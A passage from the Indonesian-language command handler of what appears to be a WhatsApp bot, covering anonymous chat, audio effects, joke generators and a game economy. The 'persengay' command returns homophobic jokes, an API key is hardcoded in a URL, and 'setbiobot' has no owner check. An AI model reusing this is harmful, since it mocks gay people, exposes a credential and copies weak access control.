        if (/video/.test(type)) {
            return await conn.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
        } else if (/image/.test(type)) {
            return await conn.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
        }
	}
	break
case 'setcmd': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                if (!m.quoted) return reply('Reply Pesan!')
                if (!m.quoted.fileSha256) return reply( 'SHA256 Hash Missing')
                if (!text) return reply(`Untuk Command Apa?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return reply('You have no permission to change conn sticker command')
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
            	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return reply(`Tidak ada hash`)
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return reply( 'You have no permission to delete conn sticker command')        
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
            	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
reply(teks)
                //hisoka.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
case 'anonymous': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
	e = '```'
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
data = `${e}Hi ${nama} Welcome To Anonymous Chat${e}

*${prefix}start* (untuk memulai anonymous)`
m.reply(data)
}
			break
case 'mulai': case 'start': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                if (Object.values(db.data.anonymous).find(room => room.check(m.sender))) {
                	e = '```'
                   m.reply(`${e}Kamu Masih Berada Di dalam Sesi Anonymous${e}\n\nketik *${prefix}keluar* (untuk keluar)`)
                    return false
                }
                let room = Object.values(db.data.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    await conn.sendMessage(room.a, { text: `${e}Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan${e}\n\n*${prefix}next* (untuk skip)\n*${prefix}keluar* (untuk keluar)` })
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await conn.sendMessage(room.b, { text: `${e}Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan${e}\n\n*${prefix}next* (untuk skip)\n*${prefix}keluar* (untuk keluar)` })
                } else {
                    let id = + new Date
                    db.data.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [conn.a, conn.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === conn.a ? conn.b : who === conn.b ? conn.a : ''
                        },
                    }
                    e = '```'
                    await m.reply(`${e}Mohon Tunggu Sedang Mencari Partner${e}\n\n*${prefix}keluar* (untuk keluar)`)
                }
                }
                break
case 'keluar': case 'leave': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                let room = Object.values(db.data.anonymous).find(room => room.check(m.sender))
                e = '```'
                if (!room) {
                    await m.reply(`${e}Kamu Sedang Tidak Berada Di Sesi Anonymous${e}\n\n*${prefix}start* (untuk mencari partner)`)
                    return false
                }
                m.reply(`${e}Berhasil keluar${e}`)
                let other = room.other(m.sender)
                if (other) await conn.sendMessage(other, { text: `${e}Partner Telah Meninggalkan Sesi Anonymous${e}` })
                
                delete db.data.anonymous[room.id]
                }
break
case 'next': case 'lanjut': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                let romeo = Object.values(db.data.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    await m.reply(`${e}Kamu Sedang Tidak Berada Di Sesi Anonymous${e}\n\n*${prefix}start* (untuk mencari partner)`)
                    return false
                }
                let other = romeo.other(m.sender)
                if (other) await conn.sendMessage(other, { text: `${e}Partner Telah Meninggalkan Sesi Anonymous${e}` })
                delete db.data.anonymous[romeo.id]
                let room = Object.values(db.data.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    await conn.sendMessage(room.a, { text: `${e}Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan${e}\n\n*${prefix}next* (untuk skip)\n*${prefix}keluar* (untuk keluar)` })
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await conn.sendMessage(room.b, { text: `${e}Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan${e}\n\n*${prefix}next* (untuk skip)\n*${prefix}keluar* (untuk keluar)` })
                } else {
                    let id = + new Date
                    db.data.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [conn.a, conn.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === conn.a ? conn.b : who === conn.b ? conn.a : ''
                        },
                    }
                    await m.reply(`${e}Mohon Tunggu Sedang Mencari Partner${e}\n\n*${prefix}keluar* (untuk keluar)`)
                }
                break
            }
           
case 'reaction': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
let notreply = 'Balas Chatnya !'
	if (!m.quoted) return reply(notreply)
	let notemo = `Example: ${prefix + command} 🥰`
	if (!text) return reply(notemo)
conn.relayMessage(m.chat, { reactionMessage: {
key: {
 id: m.quoted.id,
 remoteJid: m.chat,
 fromMe: true
},
 text: `${text}`}}, { messageId: m.id })
 }
break
case 'ban': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`Example: ${prefix + command} @tag/nomor, alasan`)
let [who, alasange] = text.split`,`
    if (m.isGroup) who = m.mentionedJid[0]
    else who = m.chat
    let users = global.db.data.users
    users[who].Banneduser = true
    users[who].BannedReason = alasange
    reply(`Berhasil banned user dengan alasan: ${alasange}`)
    }
break
case 'unban': {
if (!isCreator) return reply(mess.owner)
    let who
    if (m.isGroup) who = m.mentionedJid[0]
    else who = m.chat
    let users = global.db.data.users
    users[who].Banneduser = false
    reply(`Berhasil unban User`)
    }
break
case 'bahasapurba':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!text) return m.reply(`Example : ${prefix + command} Indonesia`)
hasilnya = await purba(text)
m.reply(hasilnya)
break
case 'namaninja':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!text) return m.reply(`Example : ${prefix + command} Wandy`)
hasilnya = await namaninja(text)
m.reply(hasilnya)
break
case 'trendtwit':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
m.reply(mess.wait)
trend = await trendtwit()
console.log(trend)
teks2 = `「 *TRENDTWITTER* 」\n`
for (let i of trend.result) {
teks2 += `\n*Rank* : ${i.rank}\n*Hastag* : ${i.hastag}\n*Tweet* : ${i.tweet}\n`
}
m.reply(teks2.trim())
break
case 'persengay':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!text) return m.reply(`Example : ${prefix + command} wandu`)
persengayy = ["*4%*\n\n*Tobat Ngegay Gan:v*","*9%*\n\n*OTW Tobat Gan:v*","*17%*\n\n*Kang Coli*","*28%*\n\n*Buset Dah Gay🤦*","*34%*\n\n *Korban Tusbol*","*48%*\n\n*Kang Hunter Bool:v*","*59%*\n\n *Bahaya Ni Orang Gan*","*62%*\n\n*Hati² Sama Ni Orang Beneran Dah*","*74%*\n\n*Astagfirullah Kabur Gan🏃🌬️*","83%\n\n Yaallah Nak🤦","97%\n\nAstagfirullah🤦","100%\n\nKabur ae Gan Daripada Ditusbol Bool lu🏃","29%\n\n amann:v","94%\n\n Yaallah🏃","75%\n\nHadehh Gay🤦","82%\n\nMending Lu Tobat Dah🏃","41%\n\nSering Cari Bool Diperempatan","39%\n\nSering Tusbol Bool Topan🏃"]
const kl = persengayy[Math.floor(Math.random() * persengayy.length)]
m.reply(`*Pertanyaan* : ${command} ${text}\n*Jawaban* : ${kl}`)
break
case 'joke': {
data = await fetchJson('https://some-random-api.ml/joke')
m.reply(data.joke)
}
break
case 'igmaker': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
let [username, post, follower, following] = text.split`,`
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command} wandy, 1, 1, 1`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
urlnya = await TelegraPh(media)
m.reply(mess.wait)
try {
const image = await new canva2.Ig()
.setAvatar(urlnya)
.setUsername(username)
.setPost(post)
.setFollowers(follower)
.setFollowing(following)
.toAttachment();
data = image.toBuffer();
conn.sendMessage(m.chat, { image: data, caption: "_Done_"}, { quoted: m })
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command} wandy, 1, 1, 1`)
}
}
break
case 'cekmati':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!text) return m.reply(`Example : ${prefix}cekmati Wandy`)
predea = await axios.get(`https://api.agify.io/?name=${text}`)
m.reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
break
case 'sangecek':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!text) return m.reply(`Example : ${prefix + command} wandy`)
const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const nge = sang[Math.floor(Math.random() * sang.length)]
m.reply(`*Pertanyaan* : ${command} ${text}\n*Jawaban* : ${nge}%`)
break
case 'persenganteng':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!text) return m.reply(`Example : ${prefix + command} wandy`)
const gan =['10%','30%','20%','40%','50%','60%','70%','62%','74%','83%','97%','100%','29%','94%','75%','82%','41%','39%']
const teng = gan[Math.floor(Math.random() * gan.length)]
m.reply(`*Pertanyaan* : ${command} ${text}\n*Jawaban* : ${teng}`)
break
case 'persencantik':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!text) return m.reply(`Example : ${prefix + command} wandu`)
const can =['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
m.reply(`*Pertanyaan* : ${command} ${text}\n*Jawaban* : ${tik}`)
break
case 'setbiobot':
if (!text) return reply(`Masukan Text Untuk Bio Baru Bot`)
     try {
		await conn.updateProfileStatus(text).catch(_ => _)
		conn.reply(m.chat, 'Sukses Mengganti Bio Bot', m)
} catch {
       reply(`Yah Error Kak...`)
     }
break
case 'setppbot': {
                if (!isCreator) return reply(mess.owner)
                if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                await conn.updateProfilePicture(nomorBot, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(`_Done_`)
                }
                break
case 'q': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await conn.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
case 'public': {
if (!isCreator) return reply(mess.owner)
conn.public = true
m.reply('*_Succes Change To Public - Mode_*')
}
break
case 'self': {
if (!isCreator) return reply(mess.owner)
conn.public = false
m.reply('*_Succes Change To Self - Mode_*')
}
break
case 'infochat': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                if (!m.quoted) m.reply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) return m.reply('Pesan tersebut bukan dikirim oleh bot!')
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `⭔ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                conn.sendTextWithMentions(m.chat, teks, m)
            }
            break
case 'jadian': case 'jodohku': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
	if (!m.isGroup) return m.reply(mess.group)
let member = participants.map(u => u.id)
    let orang
    if (/ku/i.test(command)) orang = m.sender
    else orang = member[Math.floor(Math.random() * member.length)]
    let jodoh = member[Math.floor(Math.random() * member.length)]
    let jawab = `@${orang.replace(/@.+/, '')} ❤️ @${jodoh.replace(/@.+/, '')}`.trim()
    let mentionedJid = [orang, jodoh]
    conn.sendTextWithMentions(m.chat, jawab, m)
    }
break
case 'bagaimanakah': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!text) return m.reply(`Example: ${prefix + command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
reply(`Pertanyaan : ${command} ${text}\nJawaban : ${ya}`)
}
break
case 'toaudio': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
            if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
            if (!quoted) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted: m })
            }
            break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
m.reply(mess.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
let buff = fs.readFileSync(ran)
conn.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m })
fs.unlinkSync(ran)
})
} else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
m.reply(e)
}
break
case 'apakah': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!text) return m.reply(`Example : ${prefix + command} gw kaya`)
const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi']
const kah = apa[Math.floor(Math.random() * apa.length)]
caption = `*Pertanyaan* : ${command} ${q}\n*Jawaban* : ${kah}`
m.reply(caption)
}
break
case 'bisakah': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!text) return m.reply(`Example : ${prefix + command} gw kaya`)
const apa =['Bisa banget','Tidak bisa','Mungkin bisa','Coba Ulangi']
const kah = apa[Math.floor(Math.random() * apa.length)]
caption = `*Pertanyaan* : ${command} ${q}\n*Jawaban* : ${kah}`
m.reply(caption)
}
break
case 'kapankah': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!text) return m.reply(`Example : ${prefix + command} gw kaya`)
const apa =['Tidak tau','2 taun lagi','besok paling','Coba Ulangi']
const kah = apa[Math.floor(Math.random() * apa.length)]
caption = `*Pertanyaan* : ${command} ${q}\n*Jawaban* : ${kah}`
m.reply(caption)
}
break
case 'emojimix': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return reply(`Example : ${prefix + command} 😂+😭`)
m.reply(mess.wait)
let [emoji1, emoji2] = text.split`+`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await conn.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
case 'triggered': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
m.reply(mess.wait)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
let anust = await TelegraPh(media)
conn.sendImageAsSticker(m.chat, `https://some-random-api.ml/canvas/triggered?avatar=${anust}`, m, { packname: global.packname, author: global.author })
} else {
reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'wallpaperml': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
data = await fetchJson(`https://raw.githubusercontent.com/Wandygans/database/main/wallml.js`)
randKey = await pickRandom(data)
conn.sendMessage(m.chat, { image: { url: randKey.result }, caption: `_Done_` }, { quoted: m })
}
break
case 'narik':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
const xpperatm = 1
  let countet = command.replace(/^narik/i, '')
  countet = countet ? /all/i.test(countet) ? Math.floor(global.db.data.users[m.sender].atm / xpperatm) : parseInt(countet) : args[0] ? parseInt(args[0]) : 1
  countet = Math.max(1, countet)
  if (global.db.data.users[m.sender].atm >= xpperatm * countet) {
    global.db.data.users[m.sender].atm -= xpperatm * countet
    global.db.data.users[m.sender].money += countet
    m.reply(`-Rp.${xpperatm * countet} 💳\n+Rp.${countet} 💹\n\n[ ! ] Succes menarik uang !`)
  } else m.reply(`[❗] Uang anda tidak mencukupi untuk menarik ${countet} !`)
  break
case 'tahta': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
function formula(_var, freq, offset, amp, add) {
  return `(${add.toFixed(3)}+${amp.toFixed(4)}*sin(${offset.toFixed(6)}+2*PI*${_var}*${freq.toFixed(6)}))`
}

function textArgs(text, background, color, size, fontfile, x = '200' , y = '200', w = 1024, h = 1024) {
  return `color=${background}:s=${w}x${h},drawtext=text='${text.replace(/[\\]/g, '\\$&')}':fontfile='${fontfile.replace(/[\\]/g, '\\$&')}':x=${x}:y=${y}:fontsize=${size}:fontcolor=${color}`
}

function rand(min, max, q = 0.001) {
  return Math.floor((Math.random() * (max - min)) / q) * q
}

function noise(_var, depth = 4, s = 1024, freq) {
  let forms = []
  for (let i = 0; i < depth; i++) forms.push(
    formula(
      _var,
      freq * rand(40, 80) * (s / 2048)/ s * ((i + 1) / 5),
      rand(-Math.PI, Math.PI),
      (i + 1) / depth * 8,
      0
    )
  )
  return forms.join('+')
}

let src = path.join(__dirname, './src/')
let tmp = path.join(__dirname, './tmp/')
let _font = path.join(src, 'font')
let aesthetic = path.join(src, 'Aesthetic')
function ht(text = '') {
  return new Promise((resolve, reject) => {
    let img = path.join(aesthetic, pickRandom(fs.readdirSync(aesthetic)))
    let font = path.join(_font, 'Roboto-Black.ttf')
    let w = 1024
    let h = w
    let s = w + 'x' + h
    let xF = `(${noise('X', 2, w, 1)}+${noise('Y', 1, h, 1)})/2+128`
    let yF = `((${pickRandom(['', '-'])}${45 * w / 2048}*${pickRandom(['sin', 'cos'])}(X/${w}*4*PI))+${noise('X', 5, w, 0.8)}+${noise('Y', 2, h, 1)})/1.7+128`
    let fsize = 320 / 2048 * w
    let lh = 1.5
    let format = ',format=rgb24'
    let layers = [
      `[v:0]scale=${s}${format}[im]`,
      textArgs('HARTA', 'black', 'white', fsize, font, '(w-text_w)/2', `(h-text_h)/2-(text_h*${lh})`, w, h) + format + '[top]',
      textArgs('TAHTA', 'black', 'white', fsize, font, '(w-text_w)/2', `(h-text_h)/2`, w, h) + format + '[mid]',
      textArgs(text, 'black', 'white', fsize, font, '(w-text_w)/2', `(h-text_h)/2+(text_h*${lh})`, w, h) + format + '[bot]',
      '[top][mid]blend=all_mode=addition[con]',
      '[con][bot]blend=all_mode=addition[txt]',
      `nullsrc=s=${s},geq='r=${xF}:g=${xF}:b=${xF}'[dx]`,
      `nullsrc=s=${s},geq='r=${yF}:g=${yF}:b=${yF}'[dy]`,
      '[txt][dx][dy]displace[wa]',
      '[im][wa]blend=all_mode=multiply:all_opacity=1'
    ]

    let o = 1 * new Date + '_harta_tahta.png'
    o = path.join(tmp, o)
    let args = [
      '-y',
      '-i', img,
      '-filter_complex', layers.join(';'),
      '-frames:v', '1',
      o
    ]
    console.log(layers)
    console.log('ffmpeg', ...args)
    spawn('ffmpeg', args)
    .on('error', reject)
    .on('close', () => {
      try {
        resolve(fs.readFileSync(o))
        
      } catch (e) {
        reject(e)
      }
    })
    //.stderr.on('data', a => console.log(a+''))
  })
}

conn.hartatahta = conn.hartatahta ? conn.hartatahta : {}
  if (m.chat in conn.hartatahta) return m.reply('Masih ada yang sedang membuat\nTeks Harta Tahta\ndi chat ini... tunggu sampai selesai')
  else conn.hartatahta[m.chat] = true
 if (!text) return m.reply(`Example: ${prefix + command} Wandy`)
  m.reply(mess.wait)
  try {
    let img = await ht(text ? text : ':v')
    conn.sendFile(m.chat, img, 'Harta Tahta.png', '', m)
  } finally {
    delete conn.hartatahta[m.chat]
  }
}
break
case 'progres':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
try {
ppr = await conn.profilePictureUrl(m.sender, 'image')
} catch {
ppr = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
usertod = db.data.users[m.sender]
let { min, max, xp } = levelling.xpRange(usertod.level, global.multiplier)
sendImageMentionsBuffer(await progres(ppr, nama, xp, usertod.exp - min, level), `*Name*: ${nama}\n*Level*: ${usertod.level}\n*Exp*: ${usertod.exp}`, m)
break
case 'rampok':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
let pajak = 0.02
let dapat = (Math.floor(Math.random() * 10000000000000000))
  let whoo
  if (m.isGroup) whoo = m.mentionedJid[0]
  else whoo = m.chat
  if (!whoo) return reply('Tag salah satu lah')
  let ___timers = (new Date - global.db.data.users[m.sender].lastrob)
  let ____timers = (3600000 - ___timers) 
  let times = clockString(____timers)
  let userss = global.db.data.users
  if (new Date - global.db.data.users[m.sender].lastrob > 3600000){
  if (1000 > userss[whoo].money) return reply('Target tidak memiliki uang!')
  if (db.data.users[m.sender].tertangkap < 1) return reply(`Kamu tertangkap oleh polisi karena merampok, anda harus membayar denda sebesar Rp: 150000, ketik .bayardenda untuk keluar dari penjara`)
  userss[whoo].money -= 10000000 
  userss[m.sender].money += 50000
  global.db.data.users[m.sender].lastrob = new Date * 1
  db.data.users[m.sender].tertangkap -= 1
  m.reply(`Berhasil Merampok Money Target Sebesar 50000`)
}else m.reply(`Anda Sudah merampok dan sedang bersembunyi, tunggu ${times} agar aman dari polisi`)
break
case 'simpanuang': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
const xppermoney = 1
  let counttt = command.replace(/^simpanuang/i, '')
  counttt = counttt ? /all/i.test(counttt) ? Math.floor(global.db.data.users[m.sender].money / xppermoney) : parseInt(counttt) : args[0] ? parseInt(args[0]) : 1
  counttt = Math.max(1, counttt)
  if (global.db.data.users[m.sender].money >= xppermoney * counttt) {
    global.db.data.users[m.sender].money -= xppermoney * counttt
    global.db.data.users[m.sender].atm += counttt
   reply(`-Rp.${xppermoney * counttt} 💹\n+ ${counttt} 💳\n\n[ ! ] Succes menabung !`)
  } else reply(`[❗] Uang anda tidak mencukupi untuk menabung ${counttt} !`)
  }
break
case 'bayardenda': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
const xppermoney = 150000
  if (global.db.data.users[m.sender].money >= xppermoney) {
    global.db.data.users[m.sender].money -= xppermoney
    global.db.data.users[m.sender].tertangkap += 2
   reply(`Anda terbebas dari penjara dan hidup damai setelah bayardenda Rp: 25000`)
  } else reply(`[❗] Uang anda tidak mencukupi untuk membayar denda!`)
  }
break
case 'my':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender
    else who = m.sender
    let usert = global.db.data.users[who]
